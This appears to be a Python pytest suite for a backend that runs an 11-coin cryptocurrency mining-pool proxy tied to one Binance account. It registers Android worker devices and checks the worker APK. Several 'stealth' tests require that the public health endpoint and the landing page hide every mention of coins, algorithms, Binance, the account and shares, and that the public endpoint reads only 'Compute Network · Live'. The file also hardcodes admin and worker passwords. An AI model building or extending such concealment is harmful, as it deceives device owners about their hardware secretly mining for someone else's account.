"""
Iter-11 (v1.2.5) FULL-SPECTRUM POOL INJECTION test suite.

Covers:
- /api/admin/pool/status: 11 classes armed, no password leak, redacted URLs
- /api/pool/health: stealth (no coin/algo/account/url/share leaks)
- Heartbeat with real_apk -> binance_worker_name = '<account>.<short8>'
- /api/apk/version returns 1.2.5 + signed=true
- HEAD /grid-worker-v1.2.5.apk returns 200 / content-length=29754
- pool_proxy._redact_stratum_url module import & unknown-scheme None
- Backward compat imports (STATUS, CONNECTOR, RVN_WORKER_PREFIX)
- Frontend Landing has no leaky tokens
"""
import os
import sys
import uuid
import requests
import pytest

sys.path.insert(0, "/app/backend")


def _load_base_url():
    url = os.environ.get("REACT_APP_BACKEND_URL")
    if not url:
        try:
            with open("/app/frontend/.env") as f:
                for line in f:
                    if line.strip().startswith("REACT_APP_BACKEND_URL="):
                        url = line.strip().split("=", 1)[1].strip().strip('"').strip("'")
                        break
        except Exception:
            pass
    if not url:
        raise RuntimeError("REACT_APP_BACKEND_URL not set")
    return url.rstrip("/")


BASE_URL = _load_base_url()
ADMIN_EMAIL = "admin@thegrid.io"
ADMIN_PASSWORD = "Grid@Admin2026"
WORKER_EMAIL = "worker@thegrid.io"
WORKER_PASSWORD = "Worker@2026"

EXPECTED_COINS = {"RVN", "BTC", "LTC", "DASH", "KAS", "ETC", "ZEC", "BCH", "CFX", "CKB", "ETHW"}
EXPECTED_ALGO_BY_COIN = {
    "RVN": "KawPow", "BTC": "SHA-256", "LTC": "Scrypt", "DASH": "X11",
    "KAS": "kHeavyHash", "ETC": "Etchash", "ZEC": "Equihash", "BCH": "SHA-256",
    "CFX": "Octopus", "CKB": "Eaglesong", "ETHW": "Ethash",
}
LEAK_TOKENS = ["RVN", "KawPow", "Stratum", "stratum", "Binance", "binance",
               "117423210", "Scrypt", "Etchash", "Equihash", "Octopus",
               "Eaglesong", "kHeavyHash", "poolbinance"]


@pytest.fixture(scope="module")
def admin_token():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=15)
    assert r.status_code == 200, r.text
    return r.json().get("token") or r.json().get("access_token")


@pytest.fixture(scope="module")
def worker_token():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": WORKER_EMAIL, "password": WORKER_PASSWORD}, timeout=15)
    assert r.status_code == 200, r.text
    return r.json().get("token") or r.json().get("access_token")


# ================== Admin pool status ==================
class TestAdminPoolStatus:
    def test_requires_admin(self):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status", timeout=10)
        assert r.status_code in (401, 403)

    def test_worker_rejected(self, worker_token):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status",
                         headers={"Authorization": f"Bearer {worker_token}"}, timeout=10)
        assert r.status_code in (401, 403)

    def test_full_state(self, admin_token):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status",
                         headers={"Authorization": f"Bearer {admin_token}"}, timeout=15)
        assert r.status_code == 200, r.text
        d = r.json()
        assert d["configured"] is True
        assert d["enabled"] is True
        assert d["total_classes"] == 11
        assert d["armed_count"] == 11
        assert d["all_armed"] is True
        assert d["pool_account"] == "117423210"
        assert d["pow_status"] == "native_pow_pending"
        assert "Workers registered" in d["pow_status_note"]
        assert "Accepted shares = 0" in d["pow_status_note"]
        assert "ALL CLASSES ARMED (11/11)" in d["message"]
        assert "NATIVE PoW PENDING" in d["message"]

    def test_classes_have_all_11_coins_and_correct_algos(self, admin_token):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status",
                         headers={"Authorization": f"Bearer {admin_token}"}, timeout=15)
        d = r.json()
        classes = d["classes"]
        assert len(classes) == 11
        coin_to_algo = {c["coin"]: c["algo"] for c in classes}
        assert set(coin_to_algo.keys()) == EXPECTED_COINS
        for coin, algo in EXPECTED_ALGO_BY_COIN.items():
            assert coin_to_algo[coin] == algo, f"{coin} expected {algo} got {coin_to_algo[coin]}"

    def test_each_class_connected_authorized_no_error(self, admin_token):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status",
                         headers={"Authorization": f"Bearer {admin_token}"}, timeout=15)
        d = r.json()
        for c in d["classes"]:
            assert c["connected"] is True, f"{c['coin']} not connected"
            assert c["authorized"] is True, f"{c['coin']} not authorized"
            assert (c["attempts"] or 0) >= 1, f"{c['coin']} attempts={c['attempts']}"
            assert not c["last_error"], f"{c['coin']} last_error={c['last_error']}"

    def test_no_password_leak(self, admin_token):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status",
                         headers={"Authorization": f"Bearer {admin_token}"}, timeout=15)
        d = r.json()
        flat = str(d).lower()
        assert "password" not in flat, "'password' key/string leaked"
        # POOL_PASSWORD value is 'x' which is too generic to grep, but ensure no key 'password'
        def walk(o):
            if isinstance(o, dict):
                for k, v in o.items():
                    assert k.lower() != "password"
                    walk(v)
            elif isinstance(o, list):
                for x in o: walk(x)
        walk(d)

    def test_urls_redacted(self, admin_token):
        r = requests.get(f"{BASE_URL}/api/admin/pool/status",
                         headers={"Authorization": f"Bearer {admin_token}"}, timeout=15)
        d = r.json()
        for c in d["classes"]:
            u = c.get("url") or ""
            assert "@" not in u, f"userinfo leaked in {c['coin']}: {u}"
            assert "?" not in u, f"query leaked in {c['coin']}: {u}"


# ================== Public stealth pool/health ==================
class TestPublicPoolHealthStealth:
    def test_no_auth_required(self):
        r = requests.get(f"{BASE_URL}/api/pool/health", timeout=10)
        assert r.status_code == 200

    def test_message_compute_network_live(self):
        r = requests.get(f"{BASE_URL}/api/pool/health", timeout=10)
        d = r.json()
        assert d["message"] == "Compute Network · Live", f"got {d['message']!r}"

    def test_only_safe_keys(self):
        r = requests.get(f"{BASE_URL}/api/pool/health", timeout=10)
        d = r.json()
        allowed = {"configured", "enabled", "network_live", "message"}
        extra = set(d.keys()) - allowed
        assert not extra, f"unexpected stealth keys leaked: {extra}"

    def test_no_leak_tokens_in_payload(self):
        r = requests.get(f"{BASE_URL}/api/pool/health", timeout=10)
        body = r.text
        for tok in LEAK_TOKENS + ["classes", "armed_count", "account", "share"]:
            assert tok not in body, f"leaked token {tok!r} in public health: {body}"


# ================== Heartbeat worker name ==================
class TestHeartbeatWorkerName:
    def test_real_apk_heartbeat_worker_name_format(self, worker_token):
        from pymongo import MongoClient
        # Load mongo creds
        if not os.environ.get("MONGO_URL"):
            with open("/app/backend/.env") as f:
                for line in f:
                    if line.startswith("MONGO_URL="):
                        os.environ["MONGO_URL"] = line.split("=",1)[1].strip().strip('"')
                    if line.startswith("DB_NAME="):
                        os.environ["DB_NAME"] = line.split("=",1)[1].strip().strip('"')
        did = f"TEST_iter11_{uuid.uuid4().hex[:8]}"
        r = requests.post(f"{BASE_URL}/api/devices/register",
                          headers={"Authorization": f"Bearer {worker_token}"},
                          json={"device_id": did, "name": "iter11 dev", "model": "mid",
                                "platform": "android", "brand": "TestBrand",
                                "os_version": "Android 14", "app_version": "1.2.5"},
                          timeout=15)
        assert r.status_code == 200, r.text

        # Mark as real APK
        cli = MongoClient(os.environ["MONGO_URL"])
        db = cli[os.environ["DB_NAME"]]
        db.devices.update_one({"id": did}, {"$set": {"is_real_apk": True}})
        cli.close()

        r = requests.post(f"{BASE_URL}/api/devices/heartbeat",
                          headers={"Authorization": f"Bearer {worker_token}"},
                          json={"device_id": did, "charging": True, "wifi": True,
                                "permission": True, "battery": 80, "thermal": "nominal",
                                "hashrate": 100_000, "algo": "KawPow", "country": "US"},
                          timeout=15)
        assert r.status_code == 200, r.text
        body = r.json()
        wn = body.get("pool", {}).get("binance_worker_name")
        assert wn is not None, f"binance_worker_name missing in {body}"
        # Iter-11 strict: '117423210.<8charshort>'
        short = did[:8]
        assert wn == f"117423210.{short}", f"expected '117423210.{short}' got {wn!r}"


# ================== APK v1.2.5 ==================
class TestApkV125:
    def test_apk_version(self):
        r = requests.get(f"{BASE_URL}/api/apk/version", timeout=10)
        assert r.status_code == 200
        d = r.json()
        assert d["version"] == "1.2.5"
        assert d["download_url"] == "/grid-worker-v1.2.5.apk"
        assert d["signed"] is True

    def test_apk_head(self):
        r = requests.head(f"{BASE_URL}/grid-worker-v1.2.5.apk",
                          allow_redirects=True, timeout=10)
        assert r.status_code == 200
        cl = r.headers.get("content-length") or r.headers.get("Content-Length")
        assert int(cl) == 29754


# ================== pool_proxy module imports ==================
class TestPoolProxyModule:
    def test_redact_function_imports(self):
        from pool_proxy import _redact_stratum_url
        assert _redact_stratum_url("stratum+tcp://u:p@host:9000?t=1") == "stratum+tcp://host:9000"
        assert _redact_stratum_url("stratum+tcp://host:9000") == "stratum+tcp://host:9000"
        assert _redact_stratum_url("") is None
        assert _redact_stratum_url(None) is None
        # Iter-10 hardening: unknown scheme -> None
        assert _redact_stratum_url("http://host:80") is None

    def test_backcompat_exports(self):
        # server.py imports STATUS, CONNECTOR, RVN_WORKER_PREFIX
        from pool_proxy import STATUS, CONNECTOR, RVN_WORKER_PREFIX, get_status, is_enabled
        assert STATUS is not None
        assert CONNECTOR is not None
        assert isinstance(RVN_WORKER_PREFIX, str)
        # In iter-11 the prefix should be empty per request
        assert RVN_WORKER_PREFIX == ""
        s = get_status()
        assert "classes" in s and "armed_count" in s


# ================== Frontend Landing stealth ==================
class TestFrontendLandingStealth:
    def test_landing_html_no_leak(self):
        # Fetch the rendered landing page (SSR snapshot of bundle + index.html)
        r = requests.get(BASE_URL + "/", timeout=15)
        body = r.text
        # We only check the static index.html for obvious tokens — runtime
        # rendering is verified by playwright separately.
        for tok in ["KawPow", "Etchash", "Equihash", "kHeavyHash",
                    "Eaglesong", "Octopus", "117423210", "poolbinance"]:
            assert tok not in body, f"Landing index.html leaks {tok!r}"
